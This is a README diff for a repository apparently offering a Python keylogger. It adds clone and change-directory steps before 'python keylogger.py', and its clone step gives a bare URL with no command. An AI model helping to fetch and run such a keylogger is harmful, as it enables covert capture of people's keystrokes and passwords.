@@ -46,7 +46,14 @@ app_password = "your_app_password"
 ## Usage
 
 1. **Clone the repository** (or save the Python file locally).
-2. Run the script:
+```bash
+https://github.com/MUKILESH7/Keyloggers.git
+```
+2.Change directory:
+```bash
+cd keyloggers
+```
+3. Run the script:
 
 ```bash
 python keylogger.py
